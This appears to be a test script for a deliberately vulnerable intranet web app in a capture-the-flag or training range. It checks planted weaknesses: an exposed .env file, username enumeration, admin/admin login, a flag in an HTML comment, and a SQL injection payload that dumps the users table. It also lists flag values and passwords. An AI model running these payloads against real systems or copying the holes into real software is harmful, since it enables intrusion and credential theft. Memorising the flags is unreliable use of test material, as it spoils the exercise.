#!/bin/bash
# Test A3 — Web App / Intranet
# Requires: A3 server running on $A3_HOST:$A3_PORT
# Tests:
#   - Flag 7: exposed config at /.env
#   - Flag 12: HTML comment in Project Coordination page
#   - Login works with valid creds
#   - Login differentiates "user not found" vs "incorrect password"
#   - Admin panel accessible with admin/admin
#   - Admin can see draft pages (LEVIATHAN Assembly Schedule)
#   - Wiki pages contain expected cross-asset references
#   - SQLi in search function works
#   - Status page accessible without auth

set -e

A3_HOST="${A3_HOST:-127.0.0.1}"
A3_PORT="${A3_PORT:-8081}"
BASE="http://${A3_HOST}:${A3_PORT}"

curl -sf "$BASE/status" > /dev/null 2>&1 || exit 77

python3 << 'PYEOF'
import sys, os, requests

HOST = os.environ.get("A3_HOST", "127.0.0.1")
PORT = int(os.environ.get("A3_PORT", "8081"))
BASE = f"http://{HOST}:{PORT}"
errors = []

def check(name, cond, detail=""):
    if not cond:
        errors.append(f"FAIL: {name} — {detail}")
        print(f"  FAIL: {name} — {detail}", file=sys.stderr)

# === Flag 7: Exposed config ===
r = requests.get(f"{BASE}/.env")
check("/.env accessible (200)", r.status_code == 200, f"status={r.status_code}")
check("flag 7 in .env", "FLAG{4f2e8b7a1c6d9035}" in r.text, "flag not found")
check("admin password in .env", "admin" in r.text.lower())
check("research DB creds in .env", "LabGen2025" in r.text)

r2 = requests.get(f"{BASE}/config.bak")
check("/config.bak also works", r2.status_code == 200 and "FLAG{4f2e8b7a1c6d9035}" in r2.text)

# === Status page (no auth) ===
r = requests.get(f"{BASE}/status")
check("status page accessible", r.status_code == 200)
check("status shows Python version", "Python" in r.text or "python" in r.text.lower())

# === Login: username enumeration ===
r = requests.post(f"{BASE}/login", data={"username": "nonexistent", "password": "x"})
check("nonexistent user: 'not found'", "not found" in r.text.lower(), r.text[:200])

r = requests.post(f"{BASE}/login", data={"username": "d.kowalski", "password": "wrongpass"})
check("wrong password: 'incorrect'", "incorrect" in r.text.lower(), r.text[:200])

# === Login with valid creds ===
sess = requests.Session()
r = sess.post(f"{BASE}/login", data={"username": "d.kowalski", "password": "P@ssw0rd123"}, allow_redirects=True)
check("login succeeds", r.status_code == 200)

# === Wiki pages ===
r = sess.get(f"{BASE}/wiki")
check("wiki accessible after login", r.status_code == 200 and "Wiki" in r.text)

r = sess.get(f"{BASE}/wiki/it-kb")
check("IT KB page accessible", r.status_code == 200)
check("IT KB shows hostnames", "scada-gw.boreas.local" in r.text)

r = sess.get(f"{BASE}/wiki/procurement")
check("procurement page shows file share path", "fileserv" in r.text.lower())

# === Flag 12: Project Coordination page ===
r = sess.get(f"{BASE}/wiki/project-coordination")
check("project coordination accessible", r.status_code == 200)
check("flag 12 in HTML source", "FLAG{d8a3c5e9f1b07264}" in r.text, "flag not in page source")
# Verify it's in a comment (not visible text)
check("flag 12 is in HTML comment", "<!-- FLAG{d8a3c5e9f1b07264} -->" in r.text)

# === Admin panel ===
admin_sess = requests.Session()
admin_sess.post(f"{BASE}/login", data={"username": "admin", "password": "admin"})
r = admin_sess.get(f"{BASE}/admin")
check("admin panel accessible", r.status_code == 200 and "Admin" in r.text)
check("admin sees LEVIATHAN draft", "leviathan" in r.text.lower() or "LEVIATHAN" in r.text)

r = admin_sess.get(f"{BASE}/admin/page/leviathan-schedule")
check("draft page viewable by admin", r.status_code == 200 and "MOVED TO SECURE SYSTEM" in r.text)

# Non-admin can't access admin panel
r = sess.get(f"{BASE}/admin")
check("non-admin blocked from admin", r.status_code == 403)

# === SQLi in search ===
r = sess.post(f"{BASE}/search", data={"q": "test"})
check("search works normally", r.status_code == 200)

# SQL injection: dump usernames from users table
sqli = "' UNION SELECT username, password, role FROM users--"
r = sess.post(f"{BASE}/search", data={"q": sqli})
check("SQLi returns data", r.status_code == 200)
check("SQLi reveals admin user", "admin" in r.text)

if errors:
    print(f"\n{len(errors)} checks failed:", file=sys.stderr)
    for e in errors: print(f"  {e}", file=sys.stderr)
    sys.exit(1)
PYEOF
